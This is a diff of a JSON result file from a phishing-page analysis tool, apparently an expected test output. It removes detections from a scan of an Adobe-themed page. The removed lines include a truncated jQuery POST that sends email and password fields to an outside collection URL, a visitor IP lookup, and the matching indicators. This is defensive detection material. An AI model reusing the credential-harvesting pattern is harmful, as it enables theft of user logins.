@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 852,
+    "score": 332,
     "sections": [
       {
         "auto_collapse": false,
@@ -120,7 +120,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript sends a network request via AJAX and jQuery\n\t\t$.ajax({\"url\":\"https://www.moneyminerxyx.xyz/dude/post.php\",\"type\":\"POST\",\"data\":{\"email\":\"blah.blah...\n\t\t$.ajax({",
+        "body": "JavaScript sends a network request via AJAX and jQuery\n\t\t$.ajax({",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -144,31 +144,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "A domain associated with GeoIP services was observed\n\t\tDomain 'api.ipify.org' is for a GeoIP service.",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 10,
-          "score_map": {
-            "geoip_service_request": 10
-          },
-          "signatures": {
-            "geoip_service_request": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "Signature: GeoIPServiceRequest",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "JavaScript sends a network request via jQuery\n\t\t$.getJSON(https://api.ipify.org?format=json,function(data){?            userIP = data.ip;?        })\n\t\t$.getJSON('https://api.ipify.org?format=json', function(data){",
+        "body": "JavaScript sends a network request via jQuery\n\t\t$.getJSON('https://api.ipify.org?format=json', function(data){",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -188,54 +164,6 @@
         "promote_to": null,
         "tags": {},
         "title_text": "Signature: JQueryNetworkRequest",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "JavaScript sends a network request\n\t\tXMLHttpRequest[34].send()",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 10,
-          "score_map": {
-            "network_request": 10
-          },
-          "signatures": {
-            "network_request": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "Signature: NetworkRequest",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "JavaScript makes network request via POST with password data.\n\t\tXMLHttpRequest[36].send({\"email\":\"blah.blah@blah.com\",\"pwd\":\"JsJ@w$==C00l!\",\"verify\":\"stepOne\",\"user...\n\t\tXMLHttpRequest[36].send({\"email\":\"blah.blah@blah.com\",\"pwd\":\"JsJ@w$==C00l!\",\"verify\":\"stepOne\",\"user...",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 500,
-          "score_map": {
-            "phishing_post_password": 500
-          },
-          "signatures": {
-            "phishing_post_password": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "Signature: PhishingPostPassword",
         "zeroize_on_tag_safe": false
       },
       {
@@ -294,32 +222,12 @@
             "ioc_type": "domain"
           },
           {
-            "ioc": "api.ipify.org",
-            "ioc_type": "domain"
-          },
-          {
-            "ioc": "blah.com",
-            "ioc_type": "domain"
-          },
-          {
             "ioc": "mail1.ccistack.com",
             "ioc_type": "domain"
           },
           {
             "ioc": "www.adobe.com",
             "ioc_type": "domain"
-          },
-          {
-            "ioc": "www.moneyminerxyx.xyz",
-            "ioc_type": "domain"
-          },
-          {
-            "ioc": "127.0.0.1",
-            "ioc_type": "ip"
-          },
-          {
-            "ioc": "https://api.ipify.org?format=json",
-            "ioc_type": "uri"
           },
           {
             "ioc": "https://code.jquery.com/jquery-3.4.1.min.js",
@@ -338,14 +246,6 @@
             "ioc_type": "uri"
           },
           {
-            "ioc": "https://www.moneyminerxyx.xyz/dude/post.php",
-            "ioc_type": "uri"
-          },
-          {
-            "ioc": "/dude/post.php",
-            "ioc_type": "uri_path"
-          },
-          {
             "ioc": "/favicon.ico",
             "ioc_type": "uri_path"
           },
@@ -359,10 +259,6 @@
           },
           {
             "ioc": "/jquery-3.4.1.min.js",
-            "ioc_type": "uri_path"
-          },
-          {
-            "ioc": "?format=json",
             "ioc_type": "uri_path"
           }
         ],
@@ -389,30 +285,20 @@
             "static": {
               "domain": [
                 "2fseeklogo.com",
-                "api.ipify.org",
-                "blah.com",
                 "mail1.ccistack.com",
-                "www.adobe.com",
-                "www.moneyminerxyx.xyz"
-              ],
-              "ip": [
-                "127.0.0.1"
+                "www.adobe.com"
               ],
               "uri": [
-                "https://api.ipify.org?format=json",
                 "https://code.jquery.com/jquery-3.4.1.min.js",
                 "https://mail1.ccistack.com/fmlurlsvc/?fewReq=:B:JVc9NjIyPSFxOjUpNyFuYzo3Nj03NiF0bmBpZnNydWI6MWYyZDNiMzJmP2RmNmZlMjQ+MmJjZmRhMTI1MzUwMGQyPmRhNjc0ZiFzOjYxNDI2PjE0MjYhdm5jOjY+V0tEUjBENzc+Mjc+KjY+V0tEUjBDNzc+Mjc+IXVkd3M6bGtmZnRxZmlzb2hodUdkZG5qZm5rKWRoaiFkOjY+IW9jazo3&url=https%3A%2F%2Fseeklogo.com%2Fimages%2FA%2Fadobe-logo-5CC38E11AD-seeklogo.com.png&fmlBlkTk",
                 "https://mail1.ccistack.com/fmlurlsvc/?fewReq=:B:JVc9NjIyPSFxOjUpNyFuYzo3Nj03NiF0bmBpZnNydWI6YTc/YTBjPmIyNjJlMT41MT82MGM+MDExZGI/YzU/MDcwYTZmMzMyMyFzOjYxNDI2PjE0MjYhdm5jOjY+V0tEUjBENzc+Mjc+KjY+V0tEUjBDNzc+Mjc+IXVkd3M6bGtmZnRxZmlzb2hodUdkZG5qZm5rKWRoaiFkOjY+IW9jazo3&url=https%3A%2F%2Fseeklogo.com%2Fimages%2FA%2FAdobe_PDF-logo-D4883D5CD6-seeklogo.com.png&fmlBlkTk",
-                "https://www.adobe.com/favicon.ico",
-                "https://www.moneyminerxyx.xyz/dude/post.php"
+                "https://www.adobe.com/favicon.ico"
               ],
               "uri_path": [
-                "/dude/post.php",
                 "/favicon.ico",
                 "/fmlurlsvc/?fewReq=:B:JVc9NjIyPSFxOjUpNyFuYzo3Nj03NiF0bmBpZnNydWI6MWYyZDNiMzJmP2RmNmZlMjQ+MmJjZmRhMTI1MzUwMGQyPmRhNjc0ZiFzOjYxNDI2PjE0MjYhdm5jOjY+V0tEUjBENzc+Mjc+KjY+V0tEUjBDNzc+Mjc+IXVkd3M6bGtmZnRxZmlzb2hodUdkZG5qZm5rKWRoaiFkOjY+IW9jazo3&url=https%3A%2F%2Fseeklogo.com%2Fimages%2FA%2Fadobe-logo-5CC38E11AD-seeklogo.com.png&fmlBlkTk",
                 "/fmlurlsvc/?fewReq=:B:JVc9NjIyPSFxOjUpNyFuYzo3Nj03NiF0bmBpZnNydWI6YTc/YTBjPmIyNjJlMT41MT82MGM+MDExZGI/YzU/MDcwYTZmMzMyMyFzOjYxNDI2PjE0MjYhdm5jOjY+V0tEUjBENzc+Mjc+KjY+V0tEUjBDNzc+Mjc+IXVkd3M6bGtmZnRxZmlzb2hodUdkZG5qZm5rKWRoaiFkOjY+IW9jazo3&url=https%3A%2F%2Fseeklogo.com%2Fimages%2FA%2FAdobe_PDF-logo-D4883D5CD6-seeklogo.com.png&fmlBlkTk",
-                "/jquery-3.4.1.min.js",
-                "?format=json"
+                "/jquery-3.4.1.min.js"
               ]
             }
           }
@@ -434,29 +320,12 @@
           {
             "method": "get",
             "url": "https://code.jquery.com/jquery-3.4.1.min.js"
-          },
-          {
-            "method": "get",
-            "url": "https://api.ipify.org?format=json"
-          },
-          {
-            "method": "post",
-            "request_body": {
-              "OSName": "Windows",
-              "email": "blah.blah@blah.com",
-              "pwd": "JsJ@w$==C00l!",
-              "userBrowser": "IE8",
-              "userIP": "127.0.0.1",
-              "verify": "stepOne"
-            },
-            "url": "https://www.moneyminerxyx.xyz/dude/post.php"
           }
         ],
         "body_config": {
           "column_order": [
             "url",
-            "method",
-            "request_body"
+            "method"
           ]
         },
         "body_format": "TABLE",
@@ -475,23 +344,17 @@
           "network": {
             "dynamic": {
               "domain": [
-                "mail1.ccistack.com",
-                "api.ipify.org",
-                "www.moneyminerxyx.xyz"
+                "mail1.ccistack.com"
               ],
               "uri": [
                 "https://mail1.ccistack.com/fmlurlsvc/?fewReq=:B:JVc9NjIyPSFxOjUpNyFuYzo3Nj03NiF0bmBpZnNydWI6MWYyZDNiMzJmP2RmNmZlMjQ+MmJjZmRhMTI1MzUwMGQyPmRhNjc0ZiFzOjYxNDI2PjE0MjYhdm5jOjY+V0tEUjBENzc+Mjc+KjY+V0tEUjBDNzc+Mjc+IXVkd3M6bGtmZnRxZmlzb2hodUdkZG5qZm5rKWRoaiFkOjY+IW9jazo3&url=https%3a%2f%2fseeklogo.com%2fimages%2fA%2fadobe-logo-5CC38E11AD-seeklogo.com.png&fmlBlkTk",
                 "https://mail1.ccistack.com/fmlurlsvc/?fewReq=:B:JVc9NjIyPSFxOjUpNyFuYzo3Nj03NiF0bmBpZnNydWI6YTc/YTBjPmIyNjJlMT41MT82MGM+MDExZGI/YzU/MDcwYTZmMzMyMyFzOjYxNDI2PjE0MjYhdm5jOjY+V0tEUjBENzc+Mjc+KjY+V0tEUjBDNzc+Mjc+IXVkd3M6bGtmZnRxZmlzb2hodUdkZG5qZm5rKWRoaiFkOjY+IW9jazo3&url=https%3a%2f%2fseeklogo.com%2fimages%2fA%2fAdobe_PDF-logo-D4883D5CD6-seeklogo.com.png&fmlBlkTk",
-                "https://code.jquery.com/jquery-3.4.1.min.js",
-                "https://api.ipify.org?format=json",
-                "https://www.moneyminerxyx.xyz/dude/post.php"
+                "https://code.jquery.com/jquery-3.4.1.min.js"
               ],
               "uri_path": [
                 "/fmlurlsvc/?fewReq=:B:JVc9NjIyPSFxOjUpNyFuYzo3Nj03NiF0bmBpZnNydWI6MWYyZDNiMzJmP2RmNmZlMjQ+MmJjZmRhMTI1MzUwMGQyPmRhNjc0ZiFzOjYxNDI2PjE0MjYhdm5jOjY+V0tEUjBENzc+Mjc+KjY+V0tEUjBDNzc+Mjc+IXVkd3M6bGtmZnRxZmlzb2hodUdkZG5qZm5rKWRoaiFkOjY+IW9jazo3&url=https%3a%2f%2fseeklogo.com%2fimages%2fA%2fadobe-logo-5CC38E11AD-seeklogo.com.png&fmlBlkTk",
                 "/fmlurlsvc/?fewReq=:B:JVc9NjIyPSFxOjUpNyFuYzo3Nj03NiF0bmBpZnNydWI6YTc/YTBjPmIyNjJlMT41MT82MGM+MDExZGI/YzU/MDcwYTZmMzMyMyFzOjYxNDI2PjE0MjYhdm5jOjY+V0tEUjBENzc+Mjc+KjY+V0tEUjBDNzc+Mjc+IXVkd3M6bGtmZnRxZmlzb2hodUdkZG5qZm5rKWRoaiFkOjY+IW9jazo3&url=https%3a%2f%2fseeklogo.com%2fimages%2fA%2fAdobe_PDF-logo-D4883D5CD6-seeklogo.com.png&fmlBlkTk",
-                "/jquery-3.4.1.min.js",
-                "?format=json",
-                "/dude/post.php"
+                "/jquery-3.4.1.min.js"
               ]
             }
           }
@@ -502,12 +365,7 @@
     ]
   },
   "files": {
-    "extracted": [
-      {
-        "name": "https://www.moneyminerxyx.xyz/dude/post.php",
-        "sha256": "5939a2bc0ad57031fee444aeac4bd236c21ef5e5a2b5ec961fec6e8100c51c6c"
-      }
-    ],
+    "extracted": [],
     "supplementary": [
       {
         "name": "temp_javascript.js",
@@ -538,28 +396,7 @@
         "attack_ids": [],
         "heur_id": 3,
         "signatures": [
-          "geoip_service_request"
-        ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
           "jquery_network_request"
-        ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
-          "network_request"
-        ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
-          "phishing_post_password"
         ]
       },
       {
@@ -592,25 +429,10 @@
         {
           "heur_id": 1,
           "signatures": [],
-          "value": "api.ipify.org"
-        },
-        {
-          "heur_id": 1,
-          "signatures": [],
           "value": "mail1.ccistack.com"
-        },
-        {
-          "heur_id": 1,
-          "signatures": [],
-          "value": "www.moneyminerxyx.xyz"
         }
       ],
       "network.dynamic.uri": [
-        {
-          "heur_id": 1,
-          "signatures": [],
-          "value": "https://api.ipify.org?format=json"
-        },
         {
           "heur_id": 1,
           "signatures": [],
@@ -625,19 +447,9 @@
           "heur_id": 1,
           "signatures": [],
           "value": "https://mail1.ccistack.com/fmlurlsvc/?fewReq=:B:JVc9NjIyPSFxOjUpNyFuYzo3Nj03NiF0bmBpZnNydWI6YTc/YTBjPmIyNjJlMT41MT82MGM+MDExZGI/YzU/MDcwYTZmMzMyMyFzOjYxNDI2PjE0MjYhdm5jOjY+V0tEUjBENzc+Mjc+KjY+V0tEUjBDNzc+Mjc+IXVkd3M6bGtmZnRxZmlzb2hodUdkZG5qZm5rKWRoaiFkOjY+IW9jazo3&url=https%3a%2f%2fseeklogo.com%2fimages%2fA%2fAdobe_PDF-logo-D4883D5CD6-seeklogo.com.png&fmlBlkTk"
-        },
-        {
-          "heur_id": 1,
-          "signatures": [],
-          "value": "https://www.moneyminerxyx.xyz/dude/post.php"
         }
       ],
       "network.dynamic.uri_path": [
-        {
-          "heur_id": 1,
-          "signatures": [],
-          "value": "/dude/post.php"
-        },
         {
           "heur_id": 1,
           "signatures": [],
@@ -652,11 +464,6 @@
           "heur_id": 1,
           "signatures": [],
           "value": "/jquery-3.4.1.min.js"
-        },
-        {
-          "heur_id": 1,
-          "signatures": [],
-          "value": "?format=json"
         }
       ],
       "network.static.domain": [
@@ -668,42 +475,15 @@
         {
           "heur_id": 2,
           "signatures": [],
-          "value": "api.ipify.org"
-        },
-        {
-          "heur_id": 2,
-          "signatures": [],
-          "value": "blah.com"
-        },
-        {
-          "heur_id": 2,
-          "signatures": [],
           "value": "mail1.ccistack.com"
         },
         {
           "heur_id": 2,
           "signatures": [],
           "value": "www.adobe.com"
-        },
-        {
-          "heur_id": 2,
-          "signatures": [],
-          "value": "www.moneyminerxyx.xyz"
-        }
-      ],
-      "network.static.ip": [
-        {
-          "heur_id": 2,
-          "signatures": [],
-          "value": "127.0.0.1"
         }
       ],
       "network.static.uri": [
-        {
-          "heur_id": 2,
-          "signatures": [],
-          "value": "https://api.ipify.org?format=json"
-        },
         {
           "heur_id": 2,
           "signatures": [],
@@ -723,19 +503,9 @@
           "heur_id": 2,
           "signatures": [],
           "value": "https://www.adobe.com/favicon.ico"
-        },
-        {
-          "heur_id": 2,
-          "signatures": [],
-          "value": "https://www.moneyminerxyx.xyz/dude/post.php"
         }
       ],
       "network.static.uri_path": [
-        {
-          "heur_id": 2,
-          "signatures": [],
-          "value": "/dude/post.php"
-        },
         {
           "heur_id": 2,
           "signatures": [],
@@ -755,27 +525,9 @@
           "heur_id": 2,
           "signatures": [],
           "value": "/jquery-3.4.1.min.js"
-        },
-        {
-          "heur_id": 2,
-          "signatures": [],
-          "value": "?format=json"
         }
       ]
     },
-    "temp_submission_data": {
-      "uri_metadata_97d0caedad3488b7d8f801c97b280a64": {
-        "headers": {},
-        "json": {
-          "OSName": "Windows",
-          "email": "blah.blah@blah.com",
-          "pwd": "JsJ@w$==C00l!",
-          "userBrowser": "IE8",
-          "userIP": "127.0.0.1",
-          "verify": "stepOne"
-        },
-        "method": "POST"
-      }
-    }
+    "temp_submission_data": {}
   }
 }
